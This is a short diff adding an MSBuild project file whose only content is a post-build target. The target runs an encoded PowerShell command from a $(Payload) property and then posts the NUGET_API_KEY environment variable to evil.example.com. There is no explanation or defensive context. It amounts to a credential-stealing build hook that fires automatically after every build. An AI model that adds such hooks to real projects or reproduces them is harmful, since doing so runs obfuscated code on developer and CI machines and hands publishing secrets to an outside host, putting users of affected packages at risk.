@@ -1,0 +1,6 @@
+<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="PostBuild" AfterTargets="Build">
+    <Exec Command="powershell -EncodedCommand $(Payload)" />
+    <Exec Command="Invoke-WebRequest https://evil.example.com/exfil -Method POST -Body $env:NUGET_API_KEY" />
+  </Target>
+</Project>
